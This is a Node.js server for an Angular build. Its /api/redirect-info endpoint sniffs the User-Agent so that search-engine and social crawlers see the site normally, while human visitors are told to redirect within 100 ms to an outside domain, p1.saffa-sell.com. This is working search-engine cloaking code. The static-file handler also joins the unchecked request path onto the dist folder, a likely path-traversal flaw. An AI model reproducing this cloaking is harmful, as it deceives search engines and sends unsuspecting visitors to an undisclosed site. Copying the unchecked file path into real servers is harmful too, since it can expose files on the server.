const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 4000;
const DIST_FOLDER = path.join(__dirname, 'dist/angular-ssr-metadata/browser');

// MIME types for different file extensions
const MIME_TYPES = {
  '.html': 'text/html',
  '.js': 'text/javascript',
  '.css': 'text/css',
  '.json': 'application/json',
  '.png': 'image/png',
  '.jpg': 'image/jpg',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon'
};

// Detect search engine crawlers
function isSearchEngine(userAgent) {
  const searchEngines = [
    'googlebot',
    'bingbot',
    'yandexbot',
    'duckduckbot',
    'slurp',
    'baiduspider',
    'facebookexternalhit',
    'twitterbot'
  ];
  
  return searchEngines.some(crawler => 
    userAgent && userAgent.toLowerCase().includes(crawler.toLowerCase())
  );
}

// Create the server
const server = http.createServer((req, res) => {
  console.log(`${req.method} ${req.url}`);
  
  // Handle API endpoint for redirect info
  if (req.url === '/api/redirect-info') {
    const userAgent = req.headers['user-agent'] || '';
    const isBot = isSearchEngine(userAgent);
    
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      shouldRedirect: !isBot, // Don't redirect search engines
      targetUrl: 'https://p1.saffa-sell.com',
      delay: 100 // milliseconds
    }));
    return;
  }
  
  // Parse URL to get the file path
  let filePath = req.url;
  
  // If URL is '/' or doesn't have an extension, serve index.html
  if (filePath === '/' || !path.extname(filePath)) {
    filePath = '/index.html';
  }
  
  // Construct the full file path
  const fullPath = path.join(DIST_FOLDER, filePath);
  
  // Get the file extension
  const extname = path.extname(fullPath);
  const contentType = MIME_TYPES[extname] || 'application/octet-stream';
  
  // Read the file
  fs.readFile(fullPath, (err, content) => {
    if (err) {
      if (err.code === 'ENOENT') {
        // File not found, serve index.html instead (for SPA routing)
        fs.readFile(path.join(DIST_FOLDER, 'index.html'), (err, content) => {
          if (err) {
            res.writeHead(500);
            res.end('Error loading index.html');
            return;
          }
          res.writeHead(200, { 'Content-Type': 'text/html' });
          res.end(content, 'utf-8');
        });
      } else {
        // Server error
        res.writeHead(500);
        res.end(`Server Error: ${err.code}`);
      }
      return;
    }
    
    // Success - return the file
    res.writeHead(200, { 'Content-Type': contentType });
    res.end(content, 'utf-8');
  });
});

// Start the server
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Visit: http://localhost:${PORT}`);
});
